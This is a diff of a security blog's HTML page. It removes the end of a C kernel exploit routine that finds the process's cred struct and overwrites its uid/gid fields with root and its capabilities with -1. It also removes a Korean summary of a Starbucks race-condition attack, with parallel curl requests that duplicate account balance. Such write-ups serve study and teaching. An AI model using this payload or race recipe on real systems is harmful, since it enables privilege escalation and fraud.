-</span><span class='line'>    <span class="kt">uint64_t</span> <span class="n">kbase</span> <span class="o">=</span> <span class="p">(</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="n">current</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">36</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">fixptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">GENERATE_MARKER</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-</span><span class='line'>    <span class="o">*</span><span class="n">fixptr</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
-</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">4000</span><span class="p">;</span><span class="n">i</span><span class="o">+=</span><span class="mi">4</span><span class="p">){</span>
-</span><span class='line'>        <span class="c1">// hopefully, p is pointing at part of the current</span>
-</span><span class='line'>        <span class="c1">// task&#39;s task_struct</span>
-</span><span class='line'>        <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">current</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
-</span><span class='line'>        <span class="c1">// t is pointing at the start of the memory region</span>
-</span><span class='line'>        <span class="c1">// p points to, which (hopefully) is the real_creds</span>
-</span><span class='line'>        <span class="c1">// struct in our process&#39; task_struct</span>
-</span><span class='line'>        <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
-</span><span class='line'>        <span class="c1">// we believe that p[0] is a pointer to real_creds,</span>
-</span><span class='line'>        <span class="c1">// and so t is pointing to real_creds.</span>
-</span><span class='line'>        <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">||</span> <span class="p">(</span> <span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;&gt;</span><span class="mi">36</span><span class="p">)</span> <span class="o">!=</span> <span class="n">kbase</span><span class="p">))</span>
-</span><span class='line'>            <span class="k">continue</span><span class="p">;</span>
-</span><span class='line'>        <span class="k">for</span> <span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="mi">20</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>            <span class="c1">// there are 8 32-bit uid/gid fields</span>
-</span><span class='line'>            <span class="c1">// that we will check</span>
-</span><span class='line'>            <span class="c1">// to ensure they match our process&#39; uid/gid</span>
-</span><span class='line'>            <span class="k">for</span> <span class="p">(</span><span class="n">k</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">k</span><span class="o">&lt;</span><span class="mi">8</span><span class="p">;</span><span class="n">k</span><span class="o">++</span><span class="p">){</span>
-</span><span class='line'>                <span class="k">if</span> <span class="p">(((</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)</span><span class="n">uids</span><span class="p">)[</span><span class="n">k</span><span class="p">]</span> <span class="o">!=</span> <span class="n">t</span><span class="p">[</span><span class="n">j</span><span class="o">+</span><span class="n">k</span><span class="p">]){</span>
-</span><span class='line'>                    <span class="k">goto</span> <span class="n">next</span><span class="p">;</span>
-</span><span class='line'>                <span class="p">}</span>
-</span><span class='line'>            <span class="p">}</span>
-</span><span class='line'>            <span class="c1">// t[j] is the first 32-bit uid field in struct</span>
-</span><span class='line'>            <span class="c1">// cred.</span>
-</span><span class='line'>            <span class="c1">// this loop sets all 8 uid/gid fields to root</span>
-</span><span class='line'>            <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">8</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
-</span><span class='line'>                <span class="n">t</span><span class="p">[</span><span class="n">j</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class='line'>            <span class="c1">// sets the capability sets to -1.</span>
-</span><span class='line'>            <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
-</span><span class='line'>                <span class="n">t</span><span class="p">[</span><span class="n">j</span><span class="o">+</span><span class="mi">9</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
-</span><span class='line'>            <span class="k">return</span><span class="p">;</span>
-</span><span class='line'>        <span class="nl">next</span><span class="p">:</span>
-</span><span class='line'>            <span class="p">;</span>
-</span><span class='line'>        <span class="p">}</span>
-</span><span class='line'>    <span class="p">}</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/07/17/all-your-biases-belong-to-us/">All Your Biases Belong to Us</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-07-17T20:34:21+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:34 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><a href="http://www.rc4nomore.com/vanhoef-usenix2015.pdf">All Your Biases Belong To Us</a></p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/07/17/hacking-starbucks-for-unlimited-coffee/">Hacking Starbucks for Unlimited Coffee</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-07-17T20:15:05+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:15 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><a href="http://sakurity.com/blog/2015/05/21/starbucks.html">Hacking Starbucks for unlimited coffee</a></p>
-
-<p>Sakurity 의 글 하나를 요약해본다.</p>
-
-<h4>race condition</h4>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>POST /step1?amount=1&from=wallet1&to=wallet2
-</span><span class='line'>POST /step2?confirm</span></code></pre></td></tr></table></div></figure>
-
-
-<p>로 two steps 로 되어있는데,</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>curl starbucks/step1 -H Cookie: session=session1 --data amount=1&from=w1&to=w2
-</span><span class='line'>curl starbucks/step1 -H Cookie: session=session2 --data amount=1&from=w1&to=w2
-</span><span class='line'>
-</span><span class='line'>curl starbucks/step2confirm -H Cookie: session=session1 & curl starbucks/step2?confirm -H Cookie: session=session2</span></code></pre></td></tr></table></div></figure>
-
-
-<p>세션 2 개를 만들어서 대여섯번 시도하니, 돈이 복사가 되었다고 한다. 게임에 많이 나오는 돈복사 버그.</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/5">&larr; Older</a>
@@ -2005,23 +1921,23 @@
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/06/14/the-poisoned-nul-byte/">The Poisoned NUL Byte</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/14/plaidctf-ctf-2015-plaiddb/">PlaidCTF CTF 2015: PlaidDB</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/14/glibc-adventures-the-forgotten-chunks/">Glibc Adventures: The Forgotten Chunks</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/14/hitcon-ctf-2014-unexploitable-heap-overflow/">Hitcon Ctf 2014 Unexploitable Heap Overflow</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/06/13/poison-null-byte/">Poison NULL Byte</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/06/13/control-flow-enforcement-technology-preview/">Control-flow Enforcement Technology Preview</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/06/13/cve-2016-2468/">CVE-2016-2468</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/05/03/security-analysis-of-emerging-smart-home-applications/">Security Analysis of Emerging Smart Home Applications</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/04/26/rsa-sample-number/">RSA Sample Number</a>
       </li>
     
   </ul>
